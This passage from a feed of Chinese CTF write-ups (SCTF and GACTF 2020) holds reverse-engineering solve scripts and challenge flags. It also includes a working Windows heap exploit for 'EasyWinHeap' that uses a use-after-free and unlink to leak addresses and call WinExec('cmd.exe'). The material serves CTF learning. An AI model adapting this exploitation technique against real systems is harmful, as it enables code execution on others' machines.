python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>key = <span class="hljs-string">&#x27;SCTF2020&#x27;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>aes = AES.new(key,AES.MODE_ECB)<br>a = [<span class="hljs-number">142</span>, <span class="hljs-number">56</span>, <span class="hljs-number">81</span>, <span class="hljs-number">115</span>, <span class="hljs-number">166</span>, <span class="hljs-number">153</span>, <span class="hljs-number">42</span>, <span class="hljs-number">240</span>, <span class="hljs-number">218</span>, <span class="hljs-number">213</span>, <span class="hljs-number">106</span>, <span class="hljs-number">145</span>, <span class="hljs-number">233</span>, <span class="hljs-number">78</span>, <span class="hljs-number">152</span>, <span class="hljs-number">206</span>, <span class="hljs-number">42</span>, <span class="hljs-number">183</span>, <span class="hljs-number">61</span>, <span class="hljs-number">64</span>, <span class="hljs-number">241</span>, <span class="hljs-number">229</span>, <span class="hljs-number">29</span>, <span class="hljs-number">171</span>, <span class="hljs-number">239</span>, <span class="hljs-number">238</span>, <span class="hljs-number">176</span>, <span class="hljs-number">214</span>, <span class="hljs-number">20</span>, <span class="hljs-number">11</span>, <span class="hljs-number">42</span>, <span class="hljs-number">149</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i] ^= <span class="hljs-number">0x55</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    a[<span class="hljs-number">21</span>+i] = (((a[<span class="hljs-number">21</span>+i]&amp;<span class="hljs-number">0xaa</span>)&gt;&gt;<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span>)|(((a[<span class="hljs-number">21</span>+i]&lt;&lt;<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xaa</span>)&amp;<span class="hljs-number">0xff</span>)<br>    a[<span class="hljs-number">21</span>+i] ^= <span class="hljs-number">0xad</span><br>    a[<span class="hljs-number">14</span> + i] = (((a[<span class="hljs-number">14</span> + i] &amp; <span class="hljs-number">0xcc</span>) &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xff</span>) | (((a[<span class="hljs-number">14</span> + i] &lt;&lt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xcc</span>) &amp; <span class="hljs-number">0xff</span>)<br>    a[<span class="hljs-number">14</span> + i] ^= <span class="hljs-number">0xbe</span><br>    a[<span class="hljs-number">7</span> + i] = (((a[<span class="hljs-number">7</span> + i] &amp; <span class="hljs-number">0xff</span>) &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>) | (((a[<span class="hljs-number">7</span> + i] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>) &amp; <span class="hljs-number">0xff</span>)<br>    a[<span class="hljs-number">7</span> + i] ^= <span class="hljs-number">0xef</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag += <span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span> aes.decrypt(flag)<br><span class="hljs-comment">#SCTF&#123;y0u_found_the_true_secret&#125;</span><br></code></pre></td></tr></table></figure><h2 id="orz"><a href="#orz" class="headerlink" title="orz"></a>orz</h2><p>这题相对上面就没啥新东西了</p><p>前面有类似伪随机数的操作取输入三个为种子</p><p>后面操作也不难还有个des</p><p>SCTF{b5c0b187fe309af0f4d35982fd}</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="EasyWinHeap"><a href="#EasyWinHeap" class="headerlink" title="EasyWinHeap"></a>EasyWinHeap</h2><p>windows pwn</p><p>早就想入门了，一直没时间，正好考完补比赛wp时看到sctf居然有个winpwn</p><p><img src="image-20200920121620549.png" alt="image-20200920121620549"></p><p>功能四个</p><p>delete处没有置零存在uaf</p><p>edit处存在堆溢出，具体看size，寸size的时候存了size&gt;&gt;4 + 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>a=process(<span class="hljs-string">&quot;./EasyWinHeap.exe&quot;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;size &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;index &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;index &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index,content</span>):</span><br>    a.recvuntil(<span class="hljs-string">&quot;option &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    a.recvuntil(<span class="hljs-string">&quot;index &gt;&quot;</span>)<br>    a.sendline(<span class="hljs-built_in">str</span>(index))<br>    a.recvuntil(<span class="hljs-string">&quot;content  &gt;&quot;</span>)<br>    a.sendline(content)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x30</span>)<br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">4</span>)<br>show(<span class="hljs-number">2</span>)<br>a.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>heap_addr = u32(a.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap_addr -= <span class="hljs-number">0x580</span><br>idx2pptr = heap_addr + <span class="hljs-number">0x4ac</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heap_addr --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_addr)<br>edit(<span class="hljs-number">2</span>, p32(idx2pptr-<span class="hljs-number">4</span>)+p32(idx2pptr))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>edit(<span class="hljs-number">2</span>,p32(idx2pptr+<span class="hljs-number">4</span>*<span class="hljs-number">3</span>))<br>show(<span class="hljs-number">2</span>) <br>a.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>puts_addr = u32(a.recv(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>image_base = puts_addr - <span class="hljs-number">0x1044</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;puts_addr --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;image_base --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(image_base)<br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>idata_heapfree = image_base + <span class="hljs-number">0x2004</span><br>edit(<span class="hljs-number">2</span>,p32(puts_addr)+p32(idata_heapfree))<br>show(<span class="hljs-number">4</span>)<br>a.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>heapfree_addr = u32(a.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heapfree_addr --&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(heapfree_addr)<br>winexec = heapfree_addr - <span class="hljs-number">0x1dec0</span> + <span class="hljs-number">0x5CD60</span><br><span class="hljs-comment">#windbg.attach(a,script=&quot;bp EasyWinHeap.exe+10E5&quot;)</span><br>edit(<span class="hljs-number">2</span>,p32(winexec)+p32(idx2pptr))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;cmd.exe\x00\x00&#x27;</span>)<br>show(<span class="hljs-number">4</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>大致打法是，unlink leak出puts地址，然后计算出image base</p><p>接着leak kernel32.dll函数计算出winexec地址</p><p>然后调用即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gactf 2020 writeup</title>
    <link href="/2020/09/13/gactf-2020-writeup/"/>
    <url>/2020/09/13/gactf-2020-writeup/</url>
    
    <content type="html"><![CDATA[<p>考试考完，来吧咕咕咕掉的比赛重新写一下</p><a id="more"></a><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>ruby打包，直接定位createfile找到创建的文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;openssl&#x27;</span>  <br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;base64&#x27;</span>  <br><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">aes_encrypt</span><span class="hljs-params">(key,encrypted_string)</span></span><br>aes = OpenSSL::Cipher.new(<span class="hljs-string">&quot;AES-128-ECB&quot;</span>)<br>aes.encrypt<br>aes.key = key<br>cipher = aes.update(encrypted_string) &lt;&lt; aes.final<br><span class="hljs-keyword">return</span> Base64.encode64(cipher) <br><span class="hljs-keyword">end</span><br><br>print <span class="hljs-string">&quot;Enter flag: &quot;</span><br>flag = gets.chomp<br><br>key = <span class="hljs-string">&quot;Welcome_To_GACTF&quot;</span><br>cipher = <span class="hljs-string">&quot;4KeC/Oj1McI4TDIM2c9Y6ahahc6uhpPbpSgPWktXFLM=\n&quot;</span><br><br>text = aes_encrypt(key,flag)<br><span class="hljs-keyword">if</span> cipher == text<br>puts <span class="hljs-string">&quot;good!&quot;</span><br><span class="hljs-keyword">else</span><br>puts <span class="hljs-string">&quot;no!&quot;</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><img src="image-20200913152551647.png" alt="1"></p><p>解密即可</p><h2 id="WannaFlag"><a href="#WannaFlag" class="headerlink" title="WannaFlag"></a>WannaFlag</h2><p><img src="image-20200913211634186.png" alt="image-20200913211634186"></p><p>WINMAIN可以看到很明显的消息循环，向上面找一下能找到回调函数</p><p><img src="image-20200913211709335.png" alt="image-20200913211709335"></p><p><img src="image-20200913211725012.png" alt="image-20200913211725012"></p><p>进去查看主要分析这个函数，录入key，加密后比较如果正确则弹msgbox然后解密flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xFC</span>,<br>  <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x0B</span>,<br>  <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0x50</span>]<br>b = <span class="hljs-string">&#x27;ANNAWGALFYBKVIAHMXTFCAACLAAAAYK&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    ror = i%<span class="hljs-number">8</span><br>    temp = ((a[i]&gt;&gt;ror)&amp;<span class="hljs-number">0xff</span>)|((a[i]&lt;&lt;(<span class="hljs-number">8</span>-ror))&amp;<span class="hljs-number">0xff</span>)<br>    flag += <span class="hljs-built_in">chr</span>(temp^<span class="hljs-number">120</span>^<span class="hljs-built_in">ord</span>(b[i]))<br><span class="hljs-built_in">print</span> flag<br><span class="hljs-comment">#wannaflag_is_just_a_paper_tiger</span><br></code></pre></td></tr></table></figure><p>加密部分不难</p><p>GACTF{WannaFlag_is_just_a_easy_re_with_a_beautiful_appearance}</p><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>先来个smc</p><p>然后是根据第一次输入的数据进行一次加密check，手动打log看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">input</span> = <span class="hljs-number">75</span>BCD<span class="hljs-number">15</span>h<br><span class="hljs-attribute">input</span> &gt;&gt; <span class="hljs-number">0</span>xd = <span class="hljs-number">0</span>x<span class="hljs-number">00003</span>ADE<br><span class="hljs-attribute">0x00003ADE</span>^input = <span class="hljs-number">0</span>x<span class="hljs-number">075</span>BF<span class="hljs-number">7</span>CB<br><span class="hljs-attribute">0x075BF7CB</span>&lt;&lt;<span class="hljs-number">9</span> = <span class="hljs-number">0</span>xB<span class="hljs-number">7</span>EF<span class="hljs-number">9600</span><br><span class="hljs-attribute">0xB7EF9600</span>&amp;<span class="hljs-number">0</span>x<span class="hljs-number">78</span>F<span class="hljs-number">39600</span> = <span class="hljs-number">0</span>x<span class="hljs-number">30</span>E<span class="hljs-number">39600</span><br><span class="hljs-attribute">0x30E39600</span>^<span class="hljs-number">0</span>x<span class="hljs-number">075</span>BF<span class="hljs-number">7</span>CB=<span class="hljs-number">0</span>x<span class="hljs-number">37</span>B<span class="hljs-number">861</span>CB<br><span class="hljs-attribute">0x37B861CB</span>&lt;&lt;<span class="hljs-number">0</span>x<span class="hljs-number">11</span>=<span class="hljs-number">0</span>xC<span class="hljs-number">3960000</span><br><span class="hljs-attribute">0xC3960000</span>&amp;<span class="hljs-number">0</span>x<span class="hljs-number">85</span>D<span class="hljs-number">40000</span>=<span class="hljs-number">0</span>x<span class="hljs-number">81940000</span><br><span class="hljs-attribute">0x81940000</span>^<span class="hljs-number">0</span>x<span class="hljs-number">37</span>B<span class="hljs-number">861</span>CB=<span class="hljs-number">0</span>xB<span class="hljs-number">62</span>C<span class="hljs-number">61</span>CB<br><span class="hljs-attribute">0xB62C61CB</span>&gt;&gt;<span class="hljs-number">0</span>x<span class="hljs-number">13</span>=<span class="hljs-number">0</span>x<span class="hljs-number">000016</span>C<span class="hljs-number">5</span><br><span class="hljs-attribute">0x000016C5</span>^<span class="hljs-number">0</span>xB<span class="hljs-number">62</span>C<span class="hljs-number">61</span>CB=<span class="hljs-number">0</span>xB<span class="hljs-number">62</span>C<span class="hljs-number">770</span>E<br><span class="hljs-attribute">result</span> = <span class="hljs-number">0</span>xB<span class="hljs-number">62</span>C<span class="hljs-number">770</span>E<br><span class="hljs-attribute">check</span> if result == <span class="hljs-number">0</span>x<span class="hljs-number">26</span>F<span class="hljs-number">8</span>D<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>弱智z3解出来是错的，这工具以后必卸，直接用c爆破出0xffe8bc9a，所以输入是4293442714</p><p>后面就是个xor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x0000003B</span>,<span class="hljs-number">0x000000D6</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000003B</span>,<span class="hljs-number">0x000000D6</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x000000D6</span>,<span class="hljs-number">0x0000003B</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000003B</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x000000D6</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x000000D6</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000003B</span>,<span class="hljs-number">0x00000152</span>,<span class="hljs-number">0x0000014C</span>,<span class="hljs-number">0x0000003B</span>]<br>b = [<span class="hljs-number">0x0000010B</span>,<span class="hljs-number">0x0000007A</span>,<span class="hljs-number">0x00000095</span>,<span class="hljs-number">0x00000106</span>,<span class="hljs-number">0x0000007D</span>,<span class="hljs-number">0x000000AD</span>,<span class="hljs-number">0x0000012F</span>,<span class="hljs-number">0x00000165</span>,<span class="hljs-number">0x0000012D</span>,<span class="hljs-number">0x0000012F</span>,<span class="hljs-number">0x00000139</span>,<span class="hljs-number">0x0000010D</span>,<span class="hljs-number">0x000000BB</span>,<span class="hljs-number">0x00000008</span>,<span class="hljs-number">0x0000010D</span>,<span class="hljs-number">0x0000013F</span>,<span class="hljs-number">0x0000013A</span>,<span class="hljs-number">0x00000161</span>,<span class="hljs-number">0x00000057</span>,<span class="hljs-number">0x00000120</span>,<span class="hljs-number">0x0000010D</span>,<span class="hljs-number">0x0000013F</span>,<span class="hljs-number">0x0000013F</span>,<span class="hljs-number">0x000000B5</span>,<span class="hljs-number">0x00000113</span>,<span class="hljs-number">0x000000A0</span>,<span class="hljs-number">0x00000121</span>,<span class="hljs-number">0x0000010D</span>,<span class="hljs-number">0x0000000B</span>,<span class="hljs-number">0x00000139</span>,<span class="hljs-number">0x00000173</span>,<span class="hljs-number">0x00000046</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag += <span class="hljs-built_in">chr</span>((a[i]^b[i])&amp;<span class="hljs-number">0xff</span>)<br><span class="hljs-built_in">print</span> flag<br><span class="hljs-comment">#GACTF&#123;c7ack_m3_sh3ll_smc_vm_0k?&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Simulator"><a href="#Simulator" class="headerlink" title="Simulator"></a>Simulator</h2><p>lc3汇编</p><p>用Simulate打开即可</p><p><img src="image-20200914205517536.png" alt="image-20200914205517536"></p><p>类似调试器，慢慢看，和mips有点像//考完计组后还没忘</p><p>前面就是疯狂录入到0x4000处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a[] = &#123; <span class="hljs-number">0x6C</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x2B</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0x1C</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span> &#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> temp1, temp2,temp=<span class="hljs-number">0x6c</span>;<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, temp);<br><span class="hljs-keyword">for</span> (temp2 = <span class="hljs-number">32</span>; temp2 &lt; <span class="hljs-number">128</span>; temp2++)<br>&#123;<br><span class="hljs-keyword">if</span> ((((~temp) &amp; temp2) + ((~temp2) &amp; temp)) == a[i])<br>&#123;<br>temp = temp2;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20200915101908957.png" alt="image-20200915101908957"></p><p>加密部分不难</p><h2 id="PicCompress"><a href="#PicCompress" class="headerlink" title="PicCompress"></a>PicCompress</h2><p>一个图片压缩程序。。。一般情况下都不会去逆的，找一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> lzss<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>b = a.read()<br><span class="hljs-meta">&gt;&gt;&gt; </span>c = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;temp&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>buffer = lzss.decompress(b)<br><span class="hljs-meta">&gt;&gt;&gt; </span>c.write(buffer)<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><p><img src="image-20200916131152802.png" alt="image-20200916131152802"></p><h2 id="InfaintRe"><a href="#InfaintRe" class="headerlink" title="InfaintRe"></a>InfaintRe</h2><p>静态编译，hint提示了可以搜索下</p><p><img src="image-20200915200535696.png" alt="image-20200915200535696"></p><p>基本可以猜出gmp库</p><p><img src="image-20200916180102022.png" alt="image-20200916180102022"></p><p>自己做签名文件试了下效果不咋地，只能识别出部分函数。。。</p><p>有些函数像mul因为有一点不同就没识别出</p><p><img src="image-20200916180359570.png" alt="image-20200916180359570"></p><p>静态编译还是挺难受的</p><p>貌似是椭圆曲线。。。学完了再来看看把</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>复习一波pwn</title>
    <link href="/2020/09/07/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2pwn/"/>
    <url>/2020/09/07/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2pwn/</url>
    
